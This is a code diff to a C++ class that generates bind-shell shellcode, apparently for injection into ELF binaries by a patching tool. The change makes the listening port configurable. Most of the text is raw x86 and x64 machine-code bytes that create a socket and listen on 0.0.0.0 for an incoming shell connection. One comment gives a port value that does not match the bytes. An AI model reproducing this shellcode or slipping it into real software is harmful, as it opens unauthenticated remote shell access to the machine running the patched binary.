@@ -1,9 +1,13 @@
 #include "BindShellCodeProvider.h"
 #include "CSEngine.h"
 #include "BinaryEditor.h"
+#include "Config.h"
 
 void BindShellCodeProvider::getCode(uint64_t virtualAddress, std::vector<uint8_t> & allcode)
 {
+	uint16_t port = Config::instance()->getBindShellPort();
+	uint8_t s1 = (port & 0xff00) >> 8;
+	uint8_t s2 = (port & 0xff);
 	if (BinaryEditor::instance()->getPlatform() == ELF_CLASS::ELFCLASS64)
 	{
 		//完全位置无关
@@ -25,7 +29,7 @@ void BindShellCodeProvider::getCode(uint64_t virtualAddress, std::vector<uint8_t
 			0x0F, 0x05,//syscall sys_socket
 			0x48, 0x97,//xchg    rax, rdi fd
 			0x52, //push rdx
-			0xC7, 0x04, 0x24, 0x02, 0x00, 0xdd, 0xd5, //mov     [rsp], 5C110002h 监听0.0.0.0:56789
+			0xC7, 0x04, 0x24, 0x02, 0x00, s1, s2, //mov     [rsp], 5C110002h 监听0.0.0.0:56789
 			0x48, 0x89, 0xE6, //mov     rsi, rsp
 			0x6A, 0x10, // push    10h
 			0x5A, //pop     rdx
@@ -97,7 +101,7 @@ void BindShellCodeProvider::getCode(uint64_t virtualAddress, std::vector<uint8_t
 			0x5B, //pop ebx
 			0x5E, //pop esi
 			0x52, //push edx
-			0x68, 0x02, 0x00, 0xDD, 0xD5, //push	0xd5dd0002 端口56789
+			0x68, 0x02, 0x00, s1, s2, //push	0xd5dd0002 端口56789
 			0x6A, 0x10, //push 0x10
 			0x51, //push ecx
 			0x50, //push eax
